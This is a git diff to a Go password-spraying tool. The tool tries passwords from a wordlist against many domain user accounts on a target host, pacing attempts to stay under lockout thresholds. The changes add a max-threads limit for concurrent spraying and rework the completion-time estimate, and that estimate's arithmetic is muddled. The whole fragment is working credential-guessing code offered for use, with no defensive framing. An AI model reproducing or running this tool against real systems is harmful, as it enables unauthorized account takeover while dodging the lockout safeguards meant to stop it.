@@ -22,14 +22,15 @@ func main() {
 	var passFilePathArg = parser.String("p", "password-file", &argparse.Options{Required: true, Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
 	var domainArg = parser.String("d", "domain", &argparse.Options{Required: true, Help: "(Required) Domain of user "})
 	var targetArg = parser.String("t", "target", &argparse.Options{Required: true, Help: "(Required) IP or Hostname of target to authenticate against"})
-	var lockThresh = parser.Int("a", "Lockout-Threshold", &argparse.Options{Required: true, Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
-	var lockThreshTime = parser.Int("l", "Lockout-Reset", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
+	var lockThresh = parser.Int("a", "Lockout-Attempt-Threshold", &argparse.Options{Required: true, Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
+	var lockThreshTime = parser.Int("l", "Lockout-Attempt-Threshold-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
 	var lockTime = parser.Int("r", "Lockout-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute.\n"})
 	var bypassWait = parser.Flag("", "bypass-wait", &argparse.Options{Help: "Bypass initial lock threshold reset period"})
 	var noHeaderArg = parser.Flag("", "no-stats", &argparse.Options{Default: false, Help: "Suppress stats banner"})
 	var verboseArg = parser.Int("v", "verbose", &argparse.Options{Default: 2, Help: "0 - Reserved | 1 - Success Messages | 2 - Lockout , Pause , and Success Messages | 3 - Attempts, Pause, Lockout and Success Messages | 4 - Debug Messages"})
 	var logOutputFileArg = parser.String("o", "logfile", &argparse.Options{Default: "", Help: "If defined, output log to file"})
 	var noConsole = parser.Flag("", "no-console", &argparse.Options{Help: "No console output"})
+	var maxThreadsArg = parser.Int("T","max-threads",&argparse.Options{Help: "Max number threads to user. 1 per user. Default is the user list length. 0 is unlimited",Default: 0})
 	err := parser.Parse(os.Args)
 
 	var logfile *os.File
@@ -76,7 +77,7 @@ func main() {
 
 	//Check for no verbose or no stats page
 	if !*noHeaderArg && !*noConsole {
-		preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
+		preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg,*maxThreadsArg)
 	}
 
 	if *bypassWait != true {
@@ -85,18 +86,40 @@ func main() {
 	}
 
 	log.Printf("Starting Spray.....\n")
-	multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
+	multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg,*maxThreadsArg)
 }
 
-func preRunStats(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
+func preRunStats(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutThresholdTimer int, lockoutTimer int, verbose int,maxThreads int) {
+
+	/*
+	Max time is going to be bananas if we include single threads.
+	Single user guess:
+	(Number of users / threads) * ((PasswordListLength / LockoutAttemptThreshold) * LockoutThresholdTimer )
+	(100 users / 4 threads) * ((200 passwords / 9 Password Attempts before AttemptThreshold) * 15 min before lockout threshold is reset)
+
+	PasswordListLen / AttemptsBeforeLockout = roundsOfAttemptsForSingleUser
+	100 / 5 = 20 rounds of lockouts
+
+	LockoutThresholdTimer * Number of Lockouts = numberOfMin (Number of mins for a single thread to complete entirepassword list if no lockouts and no sucesses occur.)
+	15 mins * 20 rounds = 300mins
+
+
+
+	 */
 	userListLen := len(readFile(usernamePath))
-	passwordListLen := len(readFile(passwordPath))
-	numberOfRounds := passwordListLen / (lockoutThreshold - 1)
-	estimatedMaxTime := numberOfRounds * (lockoutResetTimer + 1)
-	if estimatedMaxTime == 0 {
-		estimatedMaxTime = lockoutThreshold
+	if maxThreads == 0 || maxThreads > userListLen {
+		maxThreads = userListLen
 	}
-	timeLongForm := time.Duration(estimatedMaxTime) * time.Minute
+	numberOfThreads := userListLen / maxThreads
+	passwordListLen := len(readFile(passwordPath))
+	numberOfAttemptsPerRound := passwordListLen / (lockoutThreshold - 1)
+	estimatedMaxTimePerThread := numberOfAttemptsPerRound * (lockoutThresholdTimer + 1)
+	estimatedMaxTimeTotal := numberOfThreads * estimatedMaxTimePerThread
+
+
+
+
+	timeLongForm := time.Duration(estimatedMaxTimeTotal) * time.Minute
 	var verboseDetail string
 	switch verbose {
 	case 1:
@@ -118,22 +141,23 @@ func preRunStats(usernamePath string, passwordPath string, domain string, target
 	fmt.Printf("Target Host: %s\n", targetIP)
 	fmt.Println()
 	fmt.Printf("Lockout Attempt Threshold: %d \n", lockoutThreshold)
-	fmt.Printf("Lockout Threshold Reset: %s \n", time.Duration(lockoutResetTimer)*time.Minute)
-	fmt.Printf("Lockout Timer: %s \n", time.Duration(lockoutTimer)*time.Minute)
-	fmt.Printf("Estimated Max Completion Time (if no lockout occurs): %s\n", timeLongForm)
+	fmt.Printf("Lockout Threshold Reset: %s \n", time.Duration(lockoutThresholdTimer)*time.Minute)
+	fmt.Printf("Lockout Timer: %s \n\n", time.Duration(lockoutTimer)*time.Minute)
+	fmt.Printf("Max number of Threads: %d \n", maxThreads)
+	fmt.Printf("Estimated Max Completion Time (if no lockouts or sucesses occurs): %s\n", timeLongForm)
 	fmt.Println()
 	fmt.Printf("Verbose Level: %s\n\n", verboseDetail)
 	/*
 		UserList will not matter if all accounts are tested at once.
 		PasswordListLen / lockoutThreshold = roundsOfAttempts
-		LockoutResetTimer * roundOfAttempt = Estimated max time if no lockouts occur
+		lockoutThresholdTimer * roundOfAttempt = Estimated max time if no lockouts occur
 	*/
 }
 
-func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int64, verbose int) {
+func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutThresholdTimer int64, verbose int) {
 	userList := readFile(usernamePath)
 	passwordList := readFile(passwordPath)
-	resetTimerDuration := lockoutResetTimer + 1
+	resetTimerDuration := lockoutThresholdTimer + 1
 	attemptThreshold := lockoutThreshold - 1
 	currentPasswordIndex := 0
 	for _, users := range userList {
@@ -163,17 +187,23 @@ func singleUserSpray(usernamePath string, passwordPath string, domain string, ta
 
 }
 
-func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
+func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutThresholdTimer int, lockoutTimer int, verbose int,maxThreads int) {
 	userList := readFile(usernamePath)
 	passwordList := readFile(passwordPath)
+	if maxThreads == 0 || maxThreads > len(userList) {
+		maxThreads = len(userList)
+	}
+	guard := make(chan struct{},maxThreads) // Max Thread Struct
 	var wg sync.WaitGroup
 	for x := range userList {
+		guard <- struct{}{} //Will wait until there is a free position to add another thread to guard
 		wg.Add(1)
 		userUser := userList[x]
-		//UserSpray(y, passwordPath, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer)
+		//UserSpray(y, passwordPath, domain, targetIP, lockoutThreshold, lockoutThresholdTimer, lockoutTimer)
 		go func() {
 			defer wg.Done()
-			UserSpray(userUser, passwordList, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer, verbose)
+			UserSpray(userUser, passwordList, domain, targetIP, lockoutThreshold, lockoutThresholdTimer, lockoutTimer, verbose)
+			<-guard
 		}()
 	}
 	wg.Wait()
@@ -185,10 +215,10 @@ func UserSpray(
 	passwordSlice []string,
 	domain string, targetIP string,
 	lockoutThreshold int,
-	lockoutResetTimer int,
+	lockoutThresholdTimer int,
 	lockoutTimer int,
 	verbose int) string {
-	resetTimerDuration := lockoutResetTimer + 1
+	resetTimerDuration := lockoutThresholdTimer + 1
 	attemptThreshold := lockoutThreshold - 2
 	currentPasswordIndex := 0
 	passwordListLen := len(passwordSlice) - 1
